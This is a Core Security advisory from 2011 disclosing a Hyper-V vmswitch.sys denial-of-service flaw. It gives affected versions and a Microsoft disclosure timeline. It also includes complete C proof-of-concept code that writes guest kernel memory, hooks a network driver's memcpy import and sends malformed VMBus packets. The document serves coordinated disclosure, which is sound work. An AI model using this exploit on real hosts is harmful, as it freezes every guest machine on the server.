@@ -1,0 +1,665 @@
+Core Security Technologies - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+MS HyperV Persistent DoS Vulnerability
+
+
+1. *Advisory Information*
+
+Title: MS HyperV Persistent DoS Vulnerability
+Advisory ID: CORE-2011-0203
+Advisory URL:
+http://www.coresecurity.com/content/hyperv-vmbus-persistent-dos-vulnerability
+Date published: 2011-06-14
+Date of last update: 2011-06-14
+Vendors contacted: Microsoft
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Input validation error [CWE-20]
+Impact: Denial of service
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2011-1872
+
+
+3. *Vulnerability Description*
+
+A security vulnerability was found in the driver 'vmswitch.sys',
+associated to the Windows Hypervisor subsystem, allowing an
+authenticated local DoS. The vulnerability could allow denial of service
+if a specially crafted packet is sent to the VMBus by an authenticated
+user in one of the guest virtual machines hosted by the Hyper-V server.
+The impact is all guests on that host became non-responsive.
+
+An attacker must have valid logon credentials and be able to send
+specially crafted content from a guest virtual machine to exploit this
+vulnerability. As a result, an attacker logged with admin privileges on
+a guest VM may cause:
+
+   1. All applications in virtual machines stop responding.
+   2. The host kernel CPU usage rises up to 100%.
+   3. The host machine is unable to reboot (It shows the close window
+but it never performs the host rebooting).
+
+ The vulnerability could not be exploited remotely or by anonymous users.
+
+
+4. *Vulnerable packages*
+
+   . Windows Server 2008 for x64-based Systems
+   . Windows Server 2008 for x64-based Systems SP2
+   . Windows Server 2008 R2 for x64-based Systems
+   . Windows Server 2008 R2 for x64-based Systems SP1
+
+
+5. *Non-vulnerable packages*
+
+   . Windows XP SP3
+   . Windows XP Professional x64 Edition SP2
+   . Windows Server 2003 SP2
+   . Windows Server 2003 x64 Edition SP2
+   . Windows Server 2003 with SP2 for Itanium-based Systems
+   . Windows Vista SP1 and Windows Vista SP2
+   . Windows Vista x64 Edition SP1 and Windows Vista x64 Edition SP2
+   . Windows Server 2008 for 32-bit Systems and Windows Server 2008 for
+32-bit Systems SP2
+   . Windows Server 2008 for Itanium-based Systems and Windows Server
+2008 for Itanium-based Systems SP2
+   . Windows 7 for 32-bit Systems and Windows 7 for 32-bit Systems SP1
+   . Windows 7 for x64-based Systems and Windows 7 for x64-based Systems SP1
+   . Windows Server 2008 R2 for Itanium-based Systems and Windows Server
+2008 R2 for Itanium-based Systems SP1
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+For additional information about this issue visit the Microsoft security
+bulletin MS11-047 [1]
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Nicolas Economou
+from Core Security Exploit Writers Team. The publication of this
+advisory was coordinated by Fernando Miranda from Core Security
+Advisories Team.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+This flaw is located in the hypervisor driver 'vmswitch.sys' of Windows
+systems. The Proof of Concept showed in [Sec. 8.1] was tested on the
+latest released version 6.1.7600.16701 of the above mentioned driver.
+
+When digging into the vulnerability, in the 0x20 position of a
+hypervisor packet there is a QWORD (0x3333333333333333 in the PoC) that
+seems to be the length of something. This value is checked in the
+function 'VidLockObjectShared', located in the driver 'vid.sys'. The
+QWORD is compared against the value 0xffeff and the function returns
+with error 0xC0370022 if the QWORD value is higher. Apparently, that
+makes some flag is not set and the package processing never ends.
+Unfortunately, additional and specific technical information regarding
+the root and nature of this vulnerability was not provided by Microsoft.
+
+
+8.1. *Proof of Concept*
+
+The following PoC would trigger the vulnerability. The PoC basically
+injects the functions 'handle', 'handle2' and 'packet_changer' as a
+shellcode, and calls to the command 'ipconfig' for generating activity
+in the driver of the network adapter (in order to accelerate the
+trigger). It was compiled using Borland C++ v5.5.1 for Win32, and should
+be executed under the following scenario:
+
+   1. The guest machine must be a Windows XP with SP2 or SP3.
+   2. The user running the PoC must have admin privileges.
+
+The PoC code covers the whole kernel memory looking for a pattern of
+code located in the network driver 'netvsc50.sys' on the guest machine.
+The code is in the function 'PkSendPacketSimple' and it's a call to the
+function 'memcpy'.
+
+When that pattern is located in the driver code, the entry of the
+function 'memcpy' is patched in the import table, redirecting this
+function call to the hook function 'handle', previously written by the
+PoC code in kernel memory. Then, when 'memcpy' is called by the driver
+to assemble the package to be sent to the hypervisor, the execution flow
+will jump to the 'handle2' function (via the hook set by the 'handle'),
+which is the function that receives the content of the argument passed
+to 'memcpy' and turns a 'Simple' type packet into a 'GpaDirect' type
+packet. All these steps are taken in order to trigger the vulnerability.
+
+
+8.1.1. *Code*
+
+/-----
+     
+#include <windows.h>
+#include <winnt.h>
+#include <stdio.h>
+
+typedef enum _SYSDBG_COMMAND {
+    SysDbgQueryModuleInformation,
+    SysDbgQueryTraceInformation,
+    SysDbgSetTracepoint,
+    SysDbgSetSpecialCall,
+    SysDbgClearSpecialCalls,
+    SysDbgQuerySpecialCalls,
+    SysDbgBreakPoint,
+    SysDbgQueryVersion,
+    SysDbgReadVirtual,
+    SysDbgWriteVirtual,
+    SysDbgReadPhysical,
+    SysDbgWritePhysical,
+    SysDbgReadControlSpace,
+    SysDbgWriteControlSpace,
+    SysDbgReadIoSpace,
+    SysDbgWriteIoSpace,
+    SysDbgReadMsr,
+    SysDbgWriteMsr,
+    SysDbgReadBusData,
+    SysDbgWriteBusData,
+    SysDbgCheckLowMemory,
+    SysDbgEnableKernelDebugger,
+    SysDbgDisableKernelDebugger,
+    SysDbgGetAutoKdEnable,
+    SysDbgSetAutoKdEnable,
+    SysDbgGetPrintBufferSize,
+    SysDbgSetPrintBufferSize,
+    SysDbgGetKdUmExceptionEnable,
+    SysDbgSetKdUmExceptionEnable,
+    SysDbgGetTriageDump,
+    SysDbgGetKdBlockEnable,
+    SysDbgSetKdBlockEnable,
+} SYSDBG_COMMAND, *PSYSDBG_COMMAND;
+
+typedef struct _SYSDBG_VIRTUAL
+{
+  PVOID Address;
+  PVOID Buffer;
+  ULONG Request;
+} SYSDBG_VIRTUAL, *PSYSDBG_VIRTUAL;
+
+/****************************************************************************/
+
+/* Prototypes */
+
+LONG NTAPI ( *NtSystemDebugControl ) ( IN SYSDBG_COMMAND Command, IN
+PVOID InputBuffer  OPTIONAL, IN ULONG InputBufferLength, OUT PVOID
+OutputBuffer  OPTIONAL, IN ULONG OutputBufferLength, OUT PULONG
+ReturnLength  OPTIONAL );
+int EscalatePrivileges ( void );
+int ReadKernelMemory ( void * , void * , unsigned int );
+int WriteKernelMemory ( void * , void * , unsigned int );
+
+__declspec ( naked ) void handler ( void );
+__declspec ( naked ) void handler2 ( void );
+void packet_changer ( char * );
+
+/****************************************************************************/
+
+/* Program */
+
+int main ( void )
+{
+  unsigned int original_address;
+  unsigned int memcpy_address;
+  unsigned int return_address;
+  unsigned int jmp_address;
+  unsigned int code_address = 0;
+  unsigned int pos;
+  char buffer [ 0x1000 ];
+  char cmd [ 4096 ];
+  char shellcode [ 256 ];
+  char *pattern;
+  int ret;
+
+  pattern = "\xe8\xc7\x6f\xff\xff"; /* Pattern of the code to search  */
+  EscalatePrivileges ();
+  printf( "finding shellcode...\n" );
+
+  for( pos=0x80000000; pos<0xfffff000; pos=pos+0x1000 )
+  {
+    ret = ReadKernelMemory( (void*) (pos+0x0ea), (void*) buffer, 5 ); /*
+Read the complete block */
+    if ( ret == TRUE )
+    {
+      if ( memcmp(buffer, pattern, 5) == 0 )
+      {
+        /* If match */
+        code_address = pos + 0x0ea;
+        printf( "Patching code at %x\n" , code_address );
+        break;
+      }
+    }
+  }
+
+  /* If the shellcode was found... */
+  if ( code_address != 0 )
+  {
+    /* Get the memcpy() address */
+    memcpy_address = code_address + 0xffff6fc7 + 5;
+    printf( "memcpy = %x\n" , memcpy_address );
+
+    /* Get the JMP which jumps to the memcpy() function imported from
+ntoskrnl.exe */
+    ReadKernelMemory( (void*) ( memcpy_address + 2 ), (void*)
+&jmp_address, 4 );
+    printf( "jmp_address = %x\n" , jmp_address );
+
+    /* Make a copy of mi own shellcode */
+    memcpy(shellcode, handler, 0x100 );
+
+    /* Write the handler in kernel memory */
+    ret = WriteKernelMemory( (void*) 0x8003fc00, shellcode, 0x100 );
+    printf( "write: %i\n" , ret );
+
+    /* Get the original pointer from the import's table */
+    ReadKernelMemory( (void*) jmp_address, &original_address, 4 );
+    printf( "original_address = %x\n" , original_address );
+
+    /* Copy the memcpy() return address */
+    return_address = code_address + 5;
+    ret = WriteKernelMemory( (void*) 0x8003fff8, &return_address, 4 );
+    printf ( "write: %i\n" , ret );
+
+    /* Copy the original pointer from the driver import table */
+    ret = WriteKernelMemory ( ( void * ) 0x8003fffc , &original_address
+, 4 );
+    printf ( "write: %i\n" , ret );
+
+    /* Patch the import table in order to jump to my shellcode */
+    ret = WriteKernelMemory( (void*) jmp_address, "\x00\xfc\x03\x80", 4 );
+    printf( "write: %i\n", ret );
+
+    /* Just wait before trigger the bug */
+    printf( "delaying 3 seconds...\n" );
+    Sleep( 3000 );
+
+    /* Get the system address and execute the command "ipconfig" for
+triggering the bug */
+    GetSystemDirectory( cmd, 4096 );
+    strncat( cmd, "\\ipconfig.exe /renew", 4096 );
+    system ( cmd );
+  }
+  return ( 1 );
+}
+
+/****************************************************************************/
+
+__declspec ( naked ) void handler ( void )
+{
+  /* Get the return address */
+  asm mov eax,[esp]
+
+  /* If the return address is NOT the same that I'm waiting for... */
+  asm pushad
+  asm mov ebx,0x8003fff8
+  asm cmp eax,[ebx]
+  asm jne no_change
+
+  /* Modify the return address to return to my code after complete the
+call */
+  asm popad
+  asm mov eax,0x8003fc00+0x30
+  asm mov [esp],eax
+  asm jmp exit
+
+asm no_change:
+  asm popad
+
+asm exit:
+
+  /* Just continue the execution */
+  __emit__ ( 0xff , 0x25 , 0xfc , 0xff , 0x03 , 0x80 ); // jmp [0x8003fffc ]
+
+  /* Padding */
+  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
+  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
+  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
+  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
+  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
+}
+
+/****************************************************************************/
+
+__declspec ( naked ) void handler2 ( void )
+{
+  /* Execute the code that changes the packet sent to a Hyper-V */
+  asm pushad
+  asm push eax
+  asm call packet_changer
+  asm add esp,4
+  asm popad
+
+  /* Continue normal execution */
+  __emit__ ( 0xff , 0x25 , 0xf8 , 0xff , 0x03 , 0x80 ); // jmp [0x8003fff8 ]
+}
+
+/****************************************************************************/
+
+void packet_changer ( char *packet )
+{
+  /* Point to the packet head */
+  packet = packet - 0x10;
+
+  /* Set the packet as GpaDirect */
+  packet [ 0x00 ] = 0x09;
+  packet [ 0x01 ] = 0x00;
+  packet [ 0x02 ] = 0x05;
+  packet [ 0x03 ] = 0x00;
+  packet [ 0x04 ] = 0x06;
+  packet [ 0x05 ] = 0x00;
+  packet [ 0x06 ] = 0x00;
+  packet [ 0x07 ] = 0x00;
+  packet [ 0x14 ] = 0x01;
+  packet [ 0x15 ] = 0x00;
+  packet [ 0x16 ] = 0x00;
+  packet [ 0x17 ] = 0x00;
+  packet [ 0x18 ] = 0x01;
+  packet [ 0x19 ] = 0x00;
+  packet [ 0x1a ] = 0x00;
+  packet [ 0x1b ] = 0x00;
+  packet [ 0x1c ] = 0x00;
+  packet [ 0x1d ] = 0x00;
+  packet [ 0x1e ] = 0x00;
+  packet [ 0x1f ] = 0x00;
+
+  /* vulnerable field  ( LEN of something ) */
+  packet [ 0x20 ] = 0x33;
+  packet [ 0x21 ] = 0x33;
+  packet [ 0x22 ] = 0x33;
+  packet [ 0x23 ] = 0x33;
+  packet [ 0x24 ] = 0x33;
+  packet [ 0x25 ] = 0x33;
+  packet [ 0x26 ] = 0x33;
+  packet [ 0x27 ] = 0x33;
+}
+
+/****************************************************************************/
+/****************************************************************************/
+
+int EscalatePrivileges ( void )
+{
+  TOKEN_PRIVILEGES new_token_privileges;
+  unsigned int token_handle;
+  int ret;
+
+  /* Ask for permission like a debugger  */
+  new_token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+  LookupPrivilegeValueA ( NULL, SE_DEBUG_NAME,
+&new_token_privileges.Privileges[0].Luid );
+
+  /* Open token */
+  //OpenProcessToken ( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,
+(void*) &token_handle );
+  OpenProcessToken ( GetCurrentProcess(), TOKEN_ALL_ACCESS, (void*)
+&token_handle );
+
+  /* New privilege values */
+  new_token_privileges.PrivilegeCount = 1;
+  new_token_privileges.Privileges [ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
+
+  /* Set privileges */
+  ret = AdjustTokenPrivileges( (void*) token_handle, FALSE,
+&new_token_privileges, sizeof(new_token_privileges), NULL, NULL );
+
+  return ( ret );
+}
+
+/****************************************************************************/
+
+int ReadKernelMemory ( void *address, void *buffer, unsigned int len )
+{
+  static int first_time = TRUE;
+  SYSDBG_VIRTUAL DbgMemory;
+  LONG Status;
+  int ret = FALSE;
+
+  /* If it is the first time  */
+  if ( first_time == TRUE )
+  {
+    /* Resolve the function symbol */
+    NtSystemDebugControl = GetProcAddress( GetModuleHandle("ntdll.dll"),
+"NtSystemDebugControl" );
+    if ( NtSystemDebugControl == NULL )
+    {
+      puts( "Unable to resolve" );
+      return ( ret );
+    }
+    first_time = FALSE;
+  }
+
+  /* Setup the request */
+  DbgMemory.Address = address;
+  DbgMemory.Buffer  = buffer;
+  DbgMemory.Request = len;
+
+  /* Do the read */
+  Status = NtSystemDebugControl( SysDbgReadVirtual, &DbgMemory,
+sizeof(DbgMemory), NULL, 0, NULL );
+  if ( Status >= 0 )
+  {
+    ret = TRUE;
+  }
+  return ( ret );
+}
+
+/****************************************************************************/
+
+int WriteKernelMemory ( void *address , void *buffer , unsigned int len )
+{
+  static int first_time = TRUE;
+  SYSDBG_VIRTUAL DbgMemory;
+  LONG Status;
+  int ret = FALSE;
+
+  if ( first_time == TRUE )
+  {
+   /* Resolve the function symbol  */
+    NtSystemDebugControl = GetProcAddress( GetModuleHandle("ntdll.dll"),
+"NtSystemDebugControl" );
+    if ( NtSystemDebugControl == NULL )
+    {
+      puts ( "Unable to resolve" );
+      return ( ret );
+    }
+  }
+  else
+  {
+    first_time = FALSE;
+  }
+
+
+  /* Setup the request */
+  DbgMemory.Address = address;
+  DbgMemory.Buffer  = buffer;
+  DbgMemory.Request = len;
+
+  /* Do the read */
+  Status = NtSystemDebugControl ( SysDbgWriteVirtual , &DbgMemory ,
+sizeof ( DbgMemory ) , NULL , 0 , NULL );
+  if ( Status >= 0 )
+  {
+    ret = TRUE;
+  }
+  return ( ret );
+}
+
+/****************************************************************************/
+/****************************************************************************/
+
+-----/
+
+
+
+9. *Report Timeline*
+
+. 2011-02-03:
+Core Security Technologies notifies the MSRC of the vulnerability,
+setting the estimated publication date of the advisory to March 1st, 2011.
+
+. 2011-02-04:
+MSRC notifies that the case 10985 was opened to track this issue and a
+case manager will get in contact shortly.
+
+. 2011-02-22:
+MSRC notifies that the results of their investigation indicate this is
+an authenticated local DoS: An admin on a guest VM can manage to cause a
+DoS on the host. The impact is all guests on that host became
+non-responsive. This issue is considered to be bulletin class, but a
+release date was not set yet.
+
+. 2011-02-24:
+Core notifies that the analysis made by MSRC fits with the one made by
+Nicolas Economou, the discoverer of the vulnerability. Core also
+requires specific technical information to help understand the nature
+and root cause of the bug, and notifies the advisory publication was
+re-scheduled to March 15th, 2011 waiting for a MSRC update.
+
+. 2011-03-16:
+Core notifies that two release dates were missed (March 1st and March
+15th) and requests a status update and additional technical information
+about this issue.
+
+. 2011-03-17:
+Vendor acknowledges reception of the last email.
+
+. 2011-03-18:
+MSRC requests to set up a conference call to discuss this issue next
+Monday 21st.
+
+. 2011-03-21:
+MSRC asks for a conference call to discuss this issue.
+
+. 2011-03-21:
+The Core Security Advisories Team notifies their preference to maintain
+all the communication process via email in order to keep track of all
+the interactions and allow all stakeholders to take part.
+
+. 2011-03-21:
+MSRC would like to confirm that Core is declining the request to have a
+meeting on this issue.
+
+. 2011-03-21:
+The advisory coordinator notifies that he himself, on behalf of the Core
+Advisories Team, has declined the request to set up a conference call
+because of the previously mentioned reasons. Furthermore, the
+publication of an advisory usually involves several processes, triggers,
+people and teams in Core internal process:
+
+   1. the discoverer of the vulnerability,
+   2. researchers,
+   3. exploit writers,
+   4. QA and testing groups,
+   5. press people, among other;
+
+ and the Core Advisories Team prefers all interactions via email in
+order to have a better coordination. If there is something that cannot
+be resolved via email, a conference call can be eventually set up, but
+that is not necessary at the moment.
+
+. 2011-03-23:
+MSRC notifies they could not meet the deadline for the fixes and they
+moved the release date from April to June 8th.
+
+. 2011-03-31:
+Core notifies that the June release seems a bit far given that this bug
+is very close to the MS10-020 [2] reported on Dec 14th, 2010 with the
+CVE-2010-3960. When working on the Hyper-V DoS reported in MS10-020,
+Nicolas Economou discovered a new attack vector, and it is likely that
+this vulnerability is already known by others. Core notifies a release
+date near the end of April would be more convenient.
+
+. 2011-04-01:
+MSRC notifies they are currently working with the product team to
+determine if this update can be pushed into May. Because of the
+Microsoft patch Tuesday release cadence there are only two possibilities
+for release of these updates: the second Tuesday in May and the second
+Tuesday in June.
+
+. 2011-04-25:
+Core re-schedules the advisory publication to May 10th and asks MSRC if
+fixes will be available by that date.
+
+. 2011-04-25:
+MSRC notifies that, due to some testing issues that occurred with the
+fix, the team did not meet the May deadline and will need to ship this
+update on June 14th.
+
+. 2011-04-28:
+Core notifies that this issue was reported on Feb 3th, and 4 publication
+dates were already missed:
+
+   1. March 1st, 2011 (first tentative publication date)
+   2. March 15th, 2011
+   3. April 2011
+   4. May 10th, 2011
+
+ The Core Advisories Team agrees to postpone the advisory publication to
+June 14th, but that date should be considered final. Core also asks
+additional information about the affected and patched versions numbers
+related to this issue.
+
+. 2011-06-02:
+MSRC notifies that the fix for this vulnerability is in testing but no
+issues have been found so far and the security bulletin is still
+scheduled for June 14th.
+
+. 2011-06-14:
+Advisory CORE-2011-0203 is published.
+
+
+
+10. *References*
+
+[1] http://www.microsoft.com/technet/security/bulletin/MS11-047.mspx.
+[2] http://www.microsoft.com/technet/security/Bulletin/MS10-020.mspx.
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and prove real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web \ at:
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2011 Core Security
+Technologies and (c) 2011 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
